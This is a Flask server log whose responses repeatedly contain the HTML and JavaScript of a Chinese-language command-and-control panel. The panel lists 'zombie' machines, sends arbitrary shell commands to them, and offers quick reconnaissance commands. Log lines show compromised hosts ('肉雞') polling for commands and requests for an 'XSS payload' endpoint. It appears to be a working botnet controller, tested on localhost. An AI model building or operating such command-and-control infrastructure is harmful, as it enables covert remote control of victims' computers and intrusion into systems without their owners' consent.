new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:35:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:35:17 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:35:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:35:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:17] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:35:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:22] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:22] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 19:35:22 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 19:35:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 562 bytes [200 OK]>
2025-06-24 19:35:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:22] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 19:35:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 19:35:23 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 19:35:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 562 bytes [200 OK]>
2025-06-24 19:35:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:23] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 19:35:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:24 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:24] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:35:25 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:35:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:35:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:25] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:35:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:25] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 19:35:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:25] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:35:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:27 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:27] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 19:35:28 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 19:35:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:28 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:28 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 